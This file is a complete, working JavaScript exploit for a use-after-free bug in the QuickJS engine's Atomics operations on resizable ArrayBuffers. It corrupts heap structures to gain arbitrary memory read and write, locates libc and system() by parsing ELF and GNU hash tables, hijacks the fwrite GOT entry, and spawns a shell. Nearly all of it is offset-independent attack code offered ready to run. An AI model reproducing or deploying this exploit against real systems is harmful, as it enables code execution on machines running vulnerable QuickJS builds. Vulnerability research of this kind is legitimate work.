// QuickJS Atomics UAF Exploit - Offset-Independent Shell Execution
//
// Vulnerability: Use-After-Free in Atomics operations via Resizable ArrayBuffer
//
// The vulnerability exists in js_atomics_op() which captures a pointer to the
// buffer element BEFORE calling JS_ToUint32() on the value argument. JS_ToUint32
// can execute arbitrary JavaScript code via valueOf(), which can resize the
// underlying ArrayBuffer. When the buffer is resized/grown, js_realloc may
// return a new pointer and free the old memory. The stale pointer is then
// used for atomic operations, causing a use-after-free.
//
// Exploitation Strategy:
// 1. Trigger UAF by resizing ArrayBuffer in Atomics valueOf callback
// 2. Spray heap so freed region is reused for JSArrayBuffer struct
// 3. Use Atomics to corrupt JSArrayBuffer.byte_length for OOB access
// 4. Use OOB to corrupt another JSArrayBuffer's data pointer for arb r/w
// 5. Parse ELF headers to find GOT and link_map (no hardcoded offsets)
// 6. Traverse link_map to find libc base dynamically
// 7. Parse libc's symbol tables to find system() dynamically
// 8. Overwrite fwrite@GOT with system
// 9. print("sh") now calls system("sh"), spawning a shell

function hex(n) {
    if (n === null || n === undefined) return "null";
    if (typeof n !== 'bigint') return String(n);
    if (n < 0n) n = n + 0x10000000000000000n;
    return "0x" + n.toString(16);
}

// =============================================================================
// Stage 1: Create OOB buffer via UAF
// =============================================================================
let ab = new ArrayBuffer(56, { maxByteLength: 4096 });
let view = new BigUint64Array(ab);
let oobBuffer = null;

let trigger = {
    valueOf: function() {
        // Resize triggers UAF - old buffer freed, then reused for JSArrayBuffer
        ab.resize(4096);
        oobBuffer = new ArrayBuffer(64);
        // Return corrupted byte_length value (1MB access)
        return BigInt(0xffffffff00100000);
    }
};

// Atomics.exchange captures pointer, then valueOf resizes buffer
Atomics.exchange(view, 0, trigger);
let oobView = new BigUint64Array(oobBuffer);

// =============================================================================
// Stage 2: Create arbitrary read/write target
// =============================================================================
let arbBuffer = new ArrayBuffer(160);  // Unique size for identification

// Find arbBuffer's JSArrayBuffer in OOB memory
// JSArrayBuffer layout: byte_length(4)|max_byte_length(4)|detached|shared|pad|data(8)|list(16)|opaque(8)|free_func(8)
// Total: 56 bytes, with signature 0xffffffff000000a0 (160 bytes, max=-1)
let arbAbufOffset = -1;
for (let i = 0; i < 500; i++) {
    if (oobView[i] == 0xffffffff000000a0n) {
        let ff = oobView[i + 6];  // free_func at offset +48 (qword index 6)
        if (ff > 0x500000000000n && ff < 0x800000000000n) {
            arbAbufOffset = i;
            break;
        }
    }
}

let origByteLenMax = oobView[arbAbufOffset];
let origData = oobView[arbAbufOffset + 2];  // data pointer at offset +16
let origFreeFunc = oobView[arbAbufOffset + 6];

// =============================================================================
// Stage 3: Arbitrary read/write primitives
// =============================================================================
function arbRead64(addr) {
    if (!addr || addr < 0x1000n) return null;
    oobView[arbAbufOffset] = 0xffffffff00000008n;  // Set byte_length = 8
    oobView[arbAbufOffset + 2] = addr;              // Point data to target
    let dv = new DataView(arbBuffer);
    let r = BigInt(dv.getUint32(0, true)) | (BigInt(dv.getUint32(4, true)) << 32n);
    oobView[arbAbufOffset] = origByteLenMax;       // Restore
    oobView[arbAbufOffset + 2] = origData;
    return r;
}

function arbReadStr(addr, len) {
    if (!addr || addr < 0x1000n) return null;
    oobView[arbAbufOffset] = (0xffffffffn << 32n) | BigInt(len);
    oobView[arbAbufOffset + 2] = addr;
    let a = new Uint8Array(arbBuffer);
    let r = "";
    for (let i = 0; i < len && a[i]; i++) r += String.fromCharCode(a[i]);
    oobView[arbAbufOffset] = origByteLenMax;
    oobView[arbAbufOffset + 2] = origData;
    return r;
}

function arbWrite64(addr, val) {
    oobView[arbAbufOffset] = 0xffffffff00000008n;
    oobView[arbAbufOffset + 2] = addr;
    let dv = new DataView(arbBuffer);
    dv.setUint32(0, Number(val & 0xffffffffn), true);
    dv.setUint32(4, Number((val >> 32n) & 0xffffffffn), true);
    oobView[arbAbufOffset] = origByteLenMax;
    oobView[arbAbufOffset + 2] = origData;
}

// =============================================================================
// Stage 4: Find PIE base by scanning for ELF header
// =============================================================================
let pieBase = origFreeFunc & ~0xfffn;  // Page-align down
while ((arbRead64(pieBase) & 0xffffffffn) != 0x464c457fn) pieBase -= 0x1000n;

// =============================================================================
// Stage 5: Parse ELF headers to find GOT (no hardcoded offsets)
// =============================================================================
// e_phoff at ELF header offset 0x20
let e_phoff = arbRead64(pieBase + 0x20n) & 0xffffffffn;
let phInfo = arbRead64(pieBase + 0x36n);
let e_phsz = phInfo & 0xffffn;        // e_phentsize at 0x36
let e_phnum = (phInfo >> 16n) & 0xffffn;  // e_phnum at 0x38

// Find PT_DYNAMIC (type=2) to locate .dynamic section
let dynAddr = 0n;
for (let i = 0n; i < e_phnum; i++) {
    let ph = pieBase + e_phoff + i * e_phsz;
    if ((arbRead64(ph) & 0xffffffffn) == 2n) {  // PT_DYNAMIC
        dynAddr = pieBase + arbRead64(ph + 0x10n);  // p_vaddr at +16
        break;
    }
}

// Parse .dynamic to find PLTGOT, STRTAB, SYMTAB, JMPREL
let pltGot = 0n, strTab = 0n, symTab = 0n, relaAddr = 0n, relaSz = 0n;
for (let d = dynAddr; ; d += 16n) {
    let tag = arbRead64(d);
    if (!tag || tag == 0n) break;
    let val = arbRead64(d + 8n);
    if (tag == 3n) pltGot = val;      // DT_PLTGOT
    if (tag == 5n) strTab = val;      // DT_STRTAB
    if (tag == 6n) symTab = val;      // DT_SYMTAB
    if (tag == 23n) relaAddr = val;   // DT_JMPREL
    if (tag == 2n) relaSz = val;      // DT_PLTRELSZ
}

// =============================================================================
// Stage 6: Find libc via link_map traversal
// =============================================================================
// GOT[1] contains link_map pointer
let lm = arbRead64(pltGot + 8n);
let libcBase = 0n;
for (let i = 0; i < 10 && lm; i++) {
    let name = arbReadStr(arbRead64(lm + 8n), 256);  // l_name at +8
    if (name && name.indexOf("libc.so") >= 0) {
        libcBase = arbRead64(lm);  // l_addr at +0
        break;
    }
    lm = arbRead64(lm + 24n);  // l_next at +24
}

// =============================================================================
// Stage 7: Find system() by parsing libc symbol tables
// =============================================================================
let libc_phoff = arbRead64(libcBase + 0x20n) & 0xffffffffn;
let libc_phInfo = arbRead64(libcBase + 0x36n);
let libc_phsz = libc_phInfo & 0xffffn;
let libc_phnum = (libc_phInfo >> 16n) & 0xffffn;

// Find libc's PT_DYNAMIC
let libc_dyn = 0n;
for (let i = 0n; i < libc_phnum; i++) {
    let ph = libcBase + libc_phoff + i * libc_phsz;
    if ((arbRead64(ph) & 0xffffffffn) == 2n) {
        libc_dyn = libcBase + arbRead64(ph + 0x10n);
        break;
    }
}

// Parse libc's .dynamic for STRTAB, SYMTAB, GNU_HASH
let libc_str = 0n, libc_sym = 0n, libc_hash = 0n;
for (let d = libc_dyn; ; d += 16n) {
    let tag = arbRead64(d);
    if (!tag || tag == 0n) break;
    let val = arbRead64(d + 8n);
    if (tag == 5n) libc_str = val;
    if (tag == 6n) libc_sym = val;
    if (tag == 0x6ffffef5n) libc_hash = val;  // DT_GNU_HASH
}

// GNU hash function for symbol lookup
function gnuHash(s) {
    let h = 5381n;
    for (let c of s) h = ((h << 5n) + h + BigInt(c.charCodeAt(0))) & 0xffffffffn;
    return h;
}

// Parse GNU hash table header
let hd0 = arbRead64(libc_hash), hd1 = arbRead64(libc_hash + 8n);
let nbkt = hd0 & 0xffffffffn;
let symoff = (hd0 >> 32n) & 0xffffffffn;
let bloom_sz = hd1 & 0xffffffffn;
let bkts = libc_hash + 16n + bloom_sz * 8n;
let chains = bkts + nbkt * 4n;

// Symbol lookup using GNU hash
function findSym(name) {
    let h = gnuHash(name), bi = h % nbkt;
    let bq = arbRead64(bkts + (bi / 2n) * 8n);
    let bv = (bi % 2n == 0n) ? (bq & 0xffffffffn) : ((bq >> 32n) & 0xffffffffn);
    if (!bv) return 0n;
    for (let si = bv; ; si++) {
        let sym = libc_sym + si * 24n;  // Elf64_Sym is 24 bytes
        let sn = arbRead64(sym) & 0xffffffffn;  // st_name
        let sv = arbRead64(sym + 8n);            // st_value
        if (arbReadStr(libc_str + sn, 64) == name) return libcBase + sv;
        let ci = si - symoff;
        let cq = arbRead64(chains + (ci / 2n) * 8n);
        let cv = (ci % 2n == 0n) ? (cq & 0xffffffffn) : ((cq >> 32n) & 0xffffffffn);
        if (cv & 1n) break;  // End of chain marker
    }
    return 0n;
}

let systemAddr = findSym("system");

// =============================================================================
// Stage 8: Find fwrite GOT and overwrite with system
// =============================================================================
// Parse relocation table to find fwrite GOT entry
let fwriteGot = 0n;
for (let r = relaAddr; r < relaAddr + relaSz; r += 24n) {
    let r_offset = arbRead64(r);
    let r_info = arbRead64(r + 8n);
    let sym_idx = (r_info >> 32n) & 0xffffffffn;
    let sym = symTab + sym_idx * 24n;
    let st_name = arbRead64(sym) & 0xffffffffn;
    let name = arbReadStr(strTab + st_name, 64);
    if (name == "fwrite") {
        fwriteGot = pieBase + r_offset;
        break;
    }
}

// Overwrite fwrite@GOT with system
arbWrite64(fwriteGot, systemAddr);

// =============================================================================
// Stage 9: Spawn shell
// =============================================================================
// print("sh") calls fwrite(str, 1, len, stdout) internally
// After GOT hijack, this becomes system("sh", 1, len, stdout)
// First argument "sh" is the command, extra args are ignored
print("sh");
